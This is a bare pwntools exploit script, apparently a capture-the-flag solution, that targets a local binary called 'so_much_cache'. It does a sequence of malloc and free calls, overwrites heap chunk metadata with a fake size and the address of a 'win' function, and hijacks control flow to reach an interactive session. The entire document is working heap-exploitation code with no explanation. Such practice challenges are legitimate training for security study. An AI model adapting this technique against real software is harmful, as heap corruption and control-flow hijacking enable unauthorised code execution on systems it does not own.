from pwn import *

p = process('./so_much_cache')
e = ELF('./so_much_cache')

p.sendlineafter(b': ', b'1')    # malloc
p.sendlineafter(b'size : ', b'24')
p.sendlineafter(b'data : ', b'A')

p.sendlineafter(b': ', b'4')    # malloc
p.sendlineafter(b': ', b'2')    # free

payload = b'A' * 0x18
payload += p64(0x21)
payload += p64(e.symbols['win'])

p.sendlineafter(b': ', b'1')    # malloc
p.sendlineafter(b'size : ', b'24')
p.sendlineafter(b'data : ', payload)

p.sendlineafter(b': ', b'5')
p.sendline(b'1')
p.interactive()
